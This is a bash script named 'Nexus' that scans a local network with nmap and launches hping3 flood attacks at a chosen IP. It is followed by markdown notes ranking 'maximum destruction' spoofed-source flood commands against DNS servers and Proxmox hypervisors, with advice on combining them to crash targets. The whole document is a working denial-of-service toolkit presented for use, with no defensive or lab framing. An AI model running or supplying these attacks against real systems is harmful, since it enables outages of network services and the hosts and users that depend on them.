#!/bin/bash

# ASCII Art Banner
echo "███╗░░██╗███████╗██╗░░██╗██╗░░░██╗░██████╗"
echo "████╗░██║██╔════╝╚██╗██╔╝██║░░░██║██╔════╝"
echo "██╔██╗██║█████╗░░░╚███╔╝░██║░░░██║╚█████╗░"
echo "██║╚████║██╔══╝░░░██╔██╗░██║░░░██║░╚═══██╗"
echo "██║░╚███║███████╗██╔╝╚██╗╚██████╔╝██████╔╝"
echo "╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═════╝░"
echo
sleep 1

# Detect network interface and subnet
INTERFACE=$(ip route | grep '^default' | awk '{print $5}')
NETWORK=$(ip -o -f inet addr show $INTERFACE | awk '{print $4}')
echo "[*] Detected interface: $INTERFACE"
echo "[*] Detected network: $NETWORK"
sleep 1

declare -A SERVICE_ATTACKS=(
    ["22"]="TCP SYN Flood"
    ["21"]="TCP SYN Flood"
    ["25"]="TCP FIN Flood"
    ["53"]="UDP Flood"
    ["80"]="TCP SYN Flood"
    ["443"]="TCP SYN Flood"
    ["3306"]="TCP RST Flood"
    ["123"]="UDP Flood"
)

main_menu() {
    echo
    echo "Select an option:"
    echo "1) Ping Sweep Network"
    echo "2) Scan Ports on Specific IP (Nexus)"
    echo "3) hping3 Attack Menu"
    echo "4) Exit"
    read -p "Choice: " CHOICE

    case $CHOICE in
        1) ping_sweep ;;
        2) port_scan ;;
        3) attack_menu ;;
        4) exit 0 ;;
        *) echo "Invalid choice"; main_menu ;;
    esac
}

ping_sweep() {
    echo "[*] Performing ping sweep on $NETWORK..."
    nmap -sn $NETWORK
    main_menu
}

port_scan() {
    read -p "Enter target IP: " TARGET_IP
    echo "[*] Scanning ports on $TARGET_IP..."
    OPEN_PORTS=$(nmap -p- --open -T4 $TARGET_IP | grep ^[0-9] | cut -d '/' -f 1)
    
    if [ -z "$OPEN_PORTS" ]; then
        echo "[*] No open ports detected."
        main_menu
    fi

    echo "[*] Open ports detected: $OPEN_PORTS"
    echo
    echo "[*] Nexus: Suggested attacks per port"
    for PORT in $OPEN_PORTS; do
        ATTACK=${SERVICE_ATTACKS[$PORT]}
        if [ -z "$ATTACK" ]; then
            ATTACK="Custom / User choice"
        fi
        echo "Port $PORT => Suggested: $ATTACK"
    done

    main_menu
}

attack_menu() {
    read -p "Enter target IP: " TARGET_IP
    echo
    echo "Select attack type:"
    echo "1) ICMP Flood"
    echo "2) TCP SYN Flood"
    echo "3) TCP ACK Flood"
    echo "4) TCP FIN Flood"
    echo "5) TCP RST Flood"
    echo "6) UDP Flood"
    echo "7) Fragmented Packet Flood"
    echo "8) Multi-Port SYN Flood"
    echo "9) Back to Main Menu"
    read -p "Choice: " ATTACK_CHOICE

    case $ATTACK_CHOICE in
        1) hping3 -1 --flood -V $TARGET_IP ;;
        2) read -p "Port: " PORT; hping3 -S --flood -p $PORT $TARGET_IP ;;
        3) read -p "Port: " PORT; hping3 -A --flood -p $PORT $TARGET_IP ;;
        4) read -p "Port: " PORT; hping3 -F --flood -p $PORT $TARGET_IP ;;
        5) read -p "Port: " PORT; hping3 -R --flood -p $PORT $TARGET_IP ;;
        6) read -p "Port: " PORT; hping3 --udp --flood -p $PORT $TARGET_IP ;;
        7) hping3 -1 --flood --frag $TARGET_IP ;;
        8) hping3 -S -p ++1 --flood $TARGET_IP ;;
        9) main_menu ;;
        *) echo "Invalid choice"; attack_menu ;;
    esac

    echo "[*] Attack in progress. Press Ctrl+C to abort."
    sleep 1
    attack_menu
}

# Start menu
main_menu




---

## 🎯 **Target: DNS Server**

### Ranked Maximum Destruction for DNS

1. **UDP Flood (DNS port 53)**

```bash
hping3 --udp --flood -V --rand-source -d 1400 -p 53 <dns-server>
```

* **Why top:** DNS is stateless UDP; massive packets + spoofed IPs saturate bandwidth instantly.

2. **SYN Flood with Random Source**

```bash
hping3 -S --flood -V -p 53 --rand-source -d 1400 <dns-server>
```

* Overloads open TCP DNS (AXFR or TCP queries) connections.

3. **ICMP Blast**

```bash
hping3 --icmp --flood --rand-source -d 1400 <dns-server>
```

* Simple but floods network stack.

4. **Fragmented SYN Flood**

```bash
hping3 -S --flood -V -p 53 -f --rand-source -d 1400 <dns-server>
```

* Breaks packet reassembly → high CPU usage.

5. **Mixed TCP Flag Flood**

```bash
hping3 -F -S -R -P -A -U --flood -V --rand-source -p 53 <dns-server>
```

* Confuses any firewall/IDS, increases overload.

**Strategy:** Combine #1 + #2 + #4 simultaneously for near-instant crash.

---

## 🎯 **Target: Proxmox Hypervisor**

### Ranked Maximum Destruction for Proxmox

1. **Fragmented SYN Flood**

```bash
hping3 -S --flood -V -p 8006 -f --rand-source -d 1400 <proxmox-ip>
```

* **Why top:** Proxmox web GUI and API respond to TCP 8006; fragmented packets hit CPU hard.

2. **SYN Flood + Big Payload**

```bash
hping3 -S --flood -V -p 8006 --rand-source -d 1400 <proxmox-ip>
```

* Saturates TCP connection table.

3. **Multi-Flag "Christmas Tree" Flood**

```bash
hping3 -F -S -R -P -A -U --flood -V --rand-source -p 8006 <proxmox-ip>
```

* Confuses firewall and network stack.

4. **ACK + FIN Flood**

```bash
hping3 -A -F --flood --rand-source -p 8006 -d 1200 <proxmox-ip>
```

* State-table exhaustion, slower but still destructive.

5. **ICMP Flood**

```bash
hping3 --icmp --flood --rand-source -d 1400 <proxmox-ip>
```

* Floods network interface.

**Strategy:** Combine #1 + #2 + #3 simultaneously → max CPU + bandwidth exhaustion → virtual machines and hypervisor services crash first.

---

💥 **Overall “Maximum Annihilation” Ranking:**

| Rank | Target  | Attack Type           | Notes                         |
| ---- | ------- | --------------------- | ----------------------------- |
| 1    | DNS     | UDP Flood             | Instant bandwidth exhaustion  |
| 2    | DNS     | Fragmented SYN        | CPU & network stack overload  |
| 3    | Proxmox | Fragmented SYN        | GUI/API crash                 |
| 4    | Proxmox | SYN Flood big payload | Connection table saturation   |
| 5    | DNS     | SYN Flood             | TCP DNS overload              |
| 6    | Proxmox | Multi-flag flood      | Firewall confusion            |
| 7    | DNS     | ICMP                  | Network stack saturation      |
| 8    | Proxmox | ACK/FIN               | Slower state table exhaustion |

---

